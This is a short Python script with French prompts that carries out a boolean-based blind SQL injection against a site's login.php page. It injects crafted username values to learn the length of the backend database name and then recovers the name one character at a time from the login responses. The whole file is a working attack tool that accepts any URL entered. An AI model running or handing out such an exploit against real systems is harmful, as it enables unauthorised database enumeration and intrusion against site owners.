import requests

url = input("Entrez l'URL : ")
db_length = 0
while True:
    payload = {"username": f"admin' and length(database())={db_length}--", "password": "test", "submit": "submit"}
    response = requests.post(url + "/login.php", data=payload)
    if "Incorrect" in response.text:
        db_length += 1
    else:
        print(f"Taille de la base de données : {db_length}")
        break
db_name = ""
for i in range(1, db_length + 1):
    for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
        payload = {"username": f"admin' and substr(database(),{i},1)='{char}'--", "password": "test", "submit": "submit"}
        response = requests.post(url + "/login.php", data=payload)
        if "Incorrect" not in response.text:
            db_name += char
            print(f"Nom de la base de données : {db_name}")
            break
